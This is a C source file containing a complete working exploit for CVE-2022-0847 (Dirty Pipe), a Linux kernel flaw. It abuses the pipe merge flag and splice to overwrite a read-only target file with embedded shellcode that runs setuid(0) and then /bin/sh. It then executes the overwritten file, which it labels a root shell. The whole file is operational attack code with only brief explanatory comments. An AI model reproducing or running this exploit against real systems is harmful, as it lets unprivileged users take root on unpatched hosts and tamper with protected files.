/*
 * exploit of CVE-2022-0847
 * written by arttnba3
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

unsigned char shellcode[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52, 0x5e,
    0x6a, 0x3b, 0x58, 0x0f, 0x05
};
unsigned int shellcode_len = 149;

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv, char **envp)
{
	long			page_size;
	size_t			offset_in_file;
	size_t 			data_size;
	int 			target_file_fd;
	int				pipe_fd[2];
	int 			pipe_size;
	char 			*buffer;
	int 			retval;

	// checking before we start to exploit
	if (argc < 2)
	{
		puts("[*] Usage: ./exp target_file");
		exit(EXIT_FAILURE);
	}

	page_size = sysconf(_SC_PAGE_SIZE);
	offset_in_file = 1;

	target_file_fd = open(argv[1], O_RDONLY);
	if (target_file_fd < 0)
		errExit("Failed to open the target file!");

	// exploit now...
	puts("\033[34m\033[1m[*] Start exploiting...\033[0m");
	
	/*
	 * prepare the pipe, make every pipe_buffer a MERGE flag
	 * Just write and read through
	 */
	puts("\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m");
	pipe(pipe_fd);
	pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
	buffer = (char*) malloc(page_size);

	for (int size_left = pipe_size; size_left > 0; )
	{
		int per_write = size_left > page_size ? page_size : size_left;
		size_left -= write(pipe_fd[1], buffer, per_write);
	}

	for (int size_left = pipe_size; size_left > 0; )
	{
		int per_read = size_left > page_size ? page_size : size_left;
		size_left -= read(pipe_fd[0], buffer, per_read);
	}

	puts("\033[32m\033[1m[+] Flag setting has been done.\033[0m");

	/*
	 * Use the splice to make the pipe_buffer->page
	 * become the page of the file mapped, by read
	 * a byte from the file accross the splice
	 */
	puts("\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m");
	offset_in_file--;	// we read a byte, so offset should minus 1
	retval = splice(target_file_fd, &offset_in_file, pipe_fd[1], NULL, 1, 0);
	if (retval < 0)
		errExit("splice failed!");
	else if (retval == 0)
		errExit("short splice!");
	puts("\033[32m\033[1m[+] File splice done.\033[0m");

	/*
	 * Now it comes to the time of exploit:
	 * the mapped page of file has been in pipe_buffer,
	 * and the PIPE_BUF_FLAG_CAN_MERGE is still set,
	 * just a simple write can make the exploit.
	 */
	retval = write(pipe_fd[1], &shellcode[1], shellcode_len);
	if (retval < 0)
		errExit("Write failed!");
	else if (retval < shellcode_len)
		errExit("Short write!");
	
	puts("\033[32m\033[1m[+] EXPLOIT DONE!\033[0m");
	puts("\033[34m\033[1m[*] Trigger root shell...\033[0m");
	system(argv[1]);
}